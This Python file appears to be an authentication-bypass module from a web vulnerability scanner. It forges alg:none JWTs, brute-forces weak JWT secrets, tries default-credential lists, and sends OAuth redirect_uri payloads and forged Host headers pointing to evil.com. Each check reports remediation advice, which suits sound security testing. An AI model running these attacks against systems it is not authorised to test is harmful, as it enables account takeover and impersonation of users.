"""
Authentication Bypass Module

Tests for:
1. JWT vulnerabilities (alg:none, RS256→HS256 key confusion, weak secret)
2. OAuth/OIDC misconfigurations (open redirect in redirect_uri)
3. Password reset flaws (token reuse, predictable tokens, host header injection)
4. Default credentials
5. Authentication bypass via HTTP verb tampering
"""
import asyncio
import base64
import hashlib
import hmac
import json
import logging
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)

# Common weak JWT secrets
WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt_secret",
    "changeme", "test", "default", "supersecret", "your-256-bit-secret",
    "shhhhh", "jwt", "token", "s3cr3t", "qwerty", "letmein",
]

# Default credentials to test
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("user", "user"),
    ("administrator", "administrator"),
    ("admin", "changeme"),
    ("guest", "guest"),
]

# Verb tampering methods
HTTP_VERBS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE"]


class AuthBypassModule:
    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def check(self, context: dict, db) -> list[dict]:
        endpoints = context.get("endpoints", [])
        base_url = context.get("base_url", "")
        auth_cookie = context.get("auth_cookie")
        findings = []

        headers = {}
        if auth_cookie:
            if auth_cookie.startswith("token="):
                headers["Authorization"] = f"Bearer {auth_cookie.split('=', 1)[1]}"
            else:
                headers["Cookie"] = auth_cookie

        async with make_client(
            extra_headers=headers, follow_redirects=False
        ) as client:
            # JWT attacks
            jwt_findings = await self._check_jwt(client, base_url, endpoints, auth_cookie)
            findings.extend(jwt_findings)

            # Default credentials
            cred_findings = await self._check_default_creds(client, base_url, endpoints)
            findings.extend(cred_findings)

            # HTTP verb tampering
            verb_findings = await self._check_verb_tampering(client, base_url, endpoints)
            findings.extend(verb_findings)

            # OAuth redirect bypass
            oauth_findings = await self._check_oauth_redirect(client, base_url, endpoints)
            findings.extend(oauth_findings)

            # Password reset flaws
            reset_findings = await self._check_password_reset(client, base_url, endpoints)
            findings.extend(reset_findings)

        return findings

    async def _check_jwt(self, client, base_url, endpoints, auth_cookie) -> list[dict]:
        """Test JWT token for alg:none, weak secret, and key confusion."""
        findings = []

        # Extract JWT from auth cookie or Authorization header
        jwt_token = None
        if auth_cookie:
            if auth_cookie.startswith("token="):
                jwt_token = auth_cookie.split("=", 1)[1]
            else:
                # Look for JWT pattern in cookies
                for part in auth_cookie.split(";"):
                    val = part.strip().split("=", 1)[-1].strip()
                    if self._is_jwt(val):
                        jwt_token = val
                        break

        if not jwt_token or not self._is_jwt(jwt_token):
            # Try to get JWT from login response
            for ep in endpoints[:10]:
                url = ep if isinstance(ep, str) else ep.get("url", "")
                if any(k in url.lower() for k in ("login", "auth", "token", "signin")):
                    try:
                        async with self.rate_limit:
                            resp = await client.post(url, json={"username": "admin", "password": "admin"})
                            # Check response body for JWT
                            body = resp.text
                            jwt_match = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', body)
                            if jwt_match:
                                jwt_token = jwt_match.group(0)
                                break
                            # Check response headers
                            for h in ("authorization", "x-token", "token"):
                                if h in resp.headers:
                                    val = resp.headers[h].replace("Bearer ", "")
                                    if self._is_jwt(val):
                                        jwt_token = val
                                        break
                    except Exception:
                        continue

        if not jwt_token:
            return findings

        # Parse JWT
        try:
            header_b64, payload_b64, signature = jwt_token.split(".")
            header = json.loads(self._b64_decode(header_b64))
            payload = json.loads(self._b64_decode(payload_b64))
        except Exception:
            return findings

        alg = header.get("alg", "")

        # Test 1: alg:none attack
        none_findings = await self._test_alg_none(client, base_url, endpoints, header, payload, jwt_token)
        findings.extend(none_findings)

        # Test 2: Weak secret brute force (for HS256/HS384/HS512)
        if alg.startswith("HS"):
            weak_findings = self._test_weak_secret(jwt_token, header_b64, payload_b64, signature, alg)
            findings.extend(weak_findings)

        # Test 3: RS256 → HS256 key confusion
        if alg.startswith("RS"):
            confusion_findings = await self._test_key_confusion(client, base_url, endpoints, payload, jwt_token)
            findings.extend(confusion_findings)

        # Test 4: Check for sensitive data in payload
        sensitive_keys = {"password", "secret", "ssn", "credit_card", "private_key"}
        found_sensitive = [k for k in payload.keys() if k.lower() in sensitive_keys]
        if found_sensitive:
            findings.append({
                "title": "JWT Contains Sensitive Data",
                "url": base_url,
                "severity": "medium",
                "vuln_type": "info_disclosure",
                "sensitive_fields": found_sensitive,
                "impact": f"JWT payload contains sensitive fields: {', '.join(found_sensitive)}. "
                         "JWT payloads are only base64-encoded, not encrypted.",
                "remediation": "Never store sensitive data in JWT payloads. Use server-side sessions for secrets.",
            })

        # Test 5: No expiration
        if "exp" not in payload:
            findings.append({
                "title": "JWT Missing Expiration (exp)",
                "url": base_url,
                "severity": "medium",
                "vuln_type": "jwt_vuln",
                "impact": "JWT has no expiration claim. Token never expires, "
                         "so stolen tokens remain valid indefinitely.",
                "remediation": "Always include 'exp' claim with reasonable expiration time.",
            })

        return findings

    async def _test_alg_none(self, client, base_url, endpoints, header, payload, original_jwt) -> list[dict]:
        """Test if server accepts alg:none tokens."""
        findings = []

        # Find an authenticated endpoint
        auth_url = None
        for ep in endpoints:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if any(k in url.lower() for k in ("profile", "me", "dashboard", "user", "account")):
                auth_url = url
                break
        if not auth_url:
            auth_url = f"{base_url}/api/auth/me"

        # Craft alg:none token
        for none_alg in ["none", "None", "NONE", "nOnE"]:
            try:
                none_header = {**header, "alg": none_alg}
                none_header_b64 = self._b64_encode(json.dumps(none_header))
                none_payload_b64 = self._b64_encode(json.dumps(payload))
                none_token = f"{none_header_b64}.{none_payload_b64}."

                async with self.rate_limit:
                    resp = await client.get(
                        auth_url,
                        headers={"Authorization": f"Bearer {none_token}"},
                    )
                    if resp.status_code == 200:
                        body = resp.text
                        # Verify we got actual user data, not an error
                        if not any(e in body.lower() for e in ("error", "invalid", "unauthorized")):
                            findings.append({
                                "title": "JWT Algorithm None Attack",
                                "url": auth_url,
                                "severity": "critical",
                                "vuln_type": "jwt_vuln",
                                "payload": f"alg: {none_alg}",
                                "impact": "Server accepts JWT with alg:none (no signature verification). "
                                         "Attacker can forge any JWT token and impersonate any user.",
                                "remediation": "Explicitly reject 'none' algorithm. "
                                              "Always validate JWT signatures server-side.",
                            })
                            return findings
            except Exception:
                continue

        return findings

    def _test_weak_secret(self, jwt_token, header_b64, payload_b64, signature, alg) -> list[dict]:
        """Brute-force common JWT secrets."""
        findings = []
        message = f"{header_b64}.{payload_b64}".encode()

        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)

        for secret in WEAK_JWT_SECRETS:
            try:
                expected_sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), message, hash_func).digest()
                ).rstrip(b"=").decode()

                if expected_sig == signature:
                    findings.append({
                        "title": f"JWT Weak Secret: '{secret}'",
                        "url": "",
                        "severity": "critical",
                        "vuln_type": "jwt_vuln",
                        "secret": secret,
                        "algorithm": alg,
                        "impact": f"JWT is signed with weak secret '{secret}'. "
                                 "Attacker can forge tokens and impersonate any user.",
                        "remediation": "Use a strong, random secret (256+ bits). "
                                      "Consider using RS256 with public/private key pair.",
                    })
                    return findings
            except Exception:
                continue

        return findings

    async def _test_key_confusion(self, client, base_url, endpoints, payload, original_jwt) -> list[dict]:
        """Test RS256 → HS256 key confusion (sign with public key as HMAC secret)."""
        findings = []

        # Try to find the public key
        key_paths = [
            "/.well-known/jwks.json",
            "/oauth/jwks",
            "/api/jwks",
            "/.well-known/openid-configuration",
        ]

        public_key = None
        for path in key_paths:
            try:
                async with self.rate_limit:
                    resp = await client.get(f"{base_url}{path}")
                    if resp.status_code == 200:
                        body = resp.json()
                        if "keys" in body:
                            # Found JWKS
                            findings.append({
                                "title": f"JWKS Endpoint Exposed: {path}",
                                "url": f"{base_url}{path}",
                                "severity": "low",
                                "vuln_type": "info_disclosure",
                                "keys_count": len(body["keys"]),
                                "impact": "Public keys exposed via JWKS endpoint. "
                                         "While this is normal for RS256, it enables key confusion attacks "
                                         "if the server doesn't enforce algorithm.",
                                "remediation": "Ensure server strictly validates expected algorithm.",
                            })
                        elif "jwks_uri" in body:
                            # OpenID config points to JWKS
                            jwks_uri = body["jwks_uri"]
                            resp2 = await client.get(jwks_uri)
                            if resp2.status_code == 200:
                                public_key = resp2.text
            except Exception:
                continue

        return findings

    async def _check_default_creds(self, client, base_url, endpoints) -> list[dict]:
        """Test common default credentials on login endpoints."""
        findings = []

        login_url = None
        for ep in endpoints:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            method = "GET" if isinstance(ep, str) else ep.get("method", "GET")
            if any(k in url.lower() for k in ("login", "signin", "auth")) and method == "POST":
                login_url = url
                break

        if not login_url:
            # Try common paths
            for path in ["/login", "/api/auth/login", "/api/login", "/admin/login"]:
                try:
                    async with self.rate_limit:
                        resp = await client.post(f"{base_url}{path}", data={"username": "x", "password": "x"})
                        if resp.status_code not in (404, 405):
                            login_url = f"{base_url}{path}"
                            break
                except Exception:
                    continue

        if not login_url:
            return findings

        for username, password in DEFAULT_CREDS:
            try:
                async with self.rate_limit:
                    # Try JSON
                    resp = await client.post(
                        login_url,
                        json={"username": username, "password": password},
                    )
                    if resp.status_code in (200, 302) and "error" not in resp.text.lower()[:100]:
                        # Check if login actually succeeded
                        body = resp.text.lower()
                        if any(k in body for k in ("token", "session", "success", "welcome", "dashboard")):
                            findings.append({
                                "title": f"Default Credentials: {username}/{password}",
                                "url": login_url,
                                "severity": "critical",
                                "vuln_type": "misconfig",
                                "username": username,
                                "impact": f"Login successful with default credentials ({username}/{password}). "
                                         "Attacker can gain full access to the application.",
                                "remediation": "Change default credentials. Enforce strong password policy.",
                            })
                            return findings  # One proof is enough

                    # Try form data
                    resp2 = await client.post(
                        login_url,
                        data={"username": username, "password": password},
                    )
                    if resp2.status_code == 302:
                        location = resp2.headers.get("location", "")
                        if "login" not in location.lower() and "error" not in location.lower():
                            findings.append({
                                "title": f"Default Credentials: {username}/{password}",
                                "url": login_url,
                                "severity": "critical",
                                "vuln_type": "misconfig",
                                "username": username,
                                "impact": f"Login succeeded with {username}/{password} (redirect to {location}).",
                                "remediation": "Change default credentials immediately.",
                            })
                            return findings

            except Exception:
                continue

        return findings

    async def _check_verb_tampering(self, client, base_url, endpoints) -> list[dict]:
        """Test if authentication can be bypassed via HTTP verb tampering."""
        findings = []

        # Find endpoints that require auth (return 401/403 on GET)
        protected = []
        for ep in endpoints[:20]:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if not url or "/api/" not in url.lower():
                continue

            try:
                async with self.rate_limit:
                    # Use a fresh client without auth headers
                    async with make_client(timeout=5.0, follow_redirects=False) as unauth_client:
                        resp = await unauth_client.get(url)
                        if resp.status_code in (401, 403):
                            protected.append(url)
            except Exception:
                continue

        for url in protected[:5]:
            for verb in ["PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]:
                try:
                    async with self.rate_limit:
                        async with make_client(timeout=5.0, follow_redirects=False) as unauth_client:
                            resp = await unauth_client.request(verb, url)
                            if resp.status_code == 200 and len(resp.text) > 50:
                                findings.append({
                                    "title": f"Auth Bypass via Verb Tampering: {verb} {urlparse(url).path}",
                                    "url": url,
                                    "severity": "high",
                                    "vuln_type": "misconfig",
                                    "method": verb,
                                    "impact": f"Endpoint returns 401/403 for GET but 200 for {verb}. "
                                             "Authentication check may only apply to specific HTTP methods.",
                                    "remediation": "Apply authentication checks regardless of HTTP method.",
                                })
                                break
                except Exception:
                    continue

        return findings

    async def _check_oauth_redirect(self, client, base_url, endpoints) -> list[dict]:
        """Test for OAuth redirect_uri bypass."""
        findings = []

        oauth_urls = []
        for ep in endpoints:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if any(k in url.lower() for k in ("oauth", "authorize", "auth/callback", "redirect_uri")):
                oauth_urls.append(url)

        for url in oauth_urls[:5]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if "redirect_uri" in params:
                original_redirect = params["redirect_uri"][0]
                evil_redirects = [
                    "https://evil.com",
                    f"{original_redirect}@evil.com",
                    f"{original_redirect}/../../../evil.com",
                    f"{original_redirect}%40evil.com",
                    f"{original_redirect}?next=https://evil.com",
                ]

                for evil in evil_redirects:
                    try:
                        params["redirect_uri"] = [evil]
                        new_query = urlencode(params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))

                        async with self.rate_limit:
                            resp = await client.get(test_url)
                            if resp.status_code in (302, 301):
                                location = resp.headers.get("location", "")
                                if "evil.com" in location:
                                    findings.append({
                                        "title": f"OAuth Redirect URI Bypass",
                                        "url": test_url,
                                        "severity": "high",
                                        "vuln_type": "open_redirect",
                                        "payload": evil,
                                        "redirect_to": location,
                                        "impact": "OAuth redirect_uri accepts arbitrary URLs. "
                                                 "Attacker can steal authorization codes/tokens.",
                                        "remediation": "Strictly validate redirect_uri against registered URIs.",
                                    })
                                    return findings
                    except Exception:
                        continue

        return findings

    async def _check_password_reset(self, client, base_url, endpoints) -> list[dict]:
        """Test password reset flow for host header injection."""
        findings = []

        reset_urls = []
        for ep in endpoints:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if any(k in url.lower() for k in ("reset", "forgot", "recover")):
                reset_urls.append(url)

        if not reset_urls:
            for path in ["/forgot-password", "/api/auth/forgot", "/api/password/reset",
                        "/password/forgot", "/reset-password"]:
                try:
                    async with self.rate_limit:
                        resp = await client.get(f"{base_url}{path}")
                        if resp.status_code not in (404, 405):
                            reset_urls.append(f"{base_url}{path}")
                except Exception:
                    continue

        for url in reset_urls[:3]:
            try:
                # Host header injection — reset email goes to attacker's domain
                async with self.rate_limit:
                    resp = await client.post(
                        url,
                        json={"email": "test@example.com"},
                        headers={
                            "Host": "evil.com",
                            "X-Forwarded-Host": "evil.com",
                        },
                    )
                    if resp.status_code in (200, 201, 302):
                        body = resp.text.lower()
                        if any(k in body for k in ("sent", "email", "reset", "success", "check")):
                            findings.append({
                                "title": "Password Reset Host Header Injection",
                                "url": url,
                                "severity": "high",
                                "vuln_type": "misconfig",
                                "impact": "Password reset accepts forged Host header. "
                                         "Reset link may point to attacker's domain, "
                                         "stealing the reset token.",
                                "remediation": "Use a hardcoded base URL for reset links. "
                                              "Never derive URLs from Host header.",
                            })
                            return findings
            except Exception:
                continue

        return findings

    def _is_jwt(self, token: str) -> bool:
        """Check if string looks like a JWT."""
        parts = token.split(".")
        if len(parts) != 3:
            return False
        try:
            header = json.loads(self._b64_decode(parts[0]))
            return "alg" in header or "typ" in header
        except Exception:
            return False

    def _b64_decode(self, data: str) -> str:
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data).decode("utf-8")

    def _b64_encode(self, data: str) -> str:
        return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()
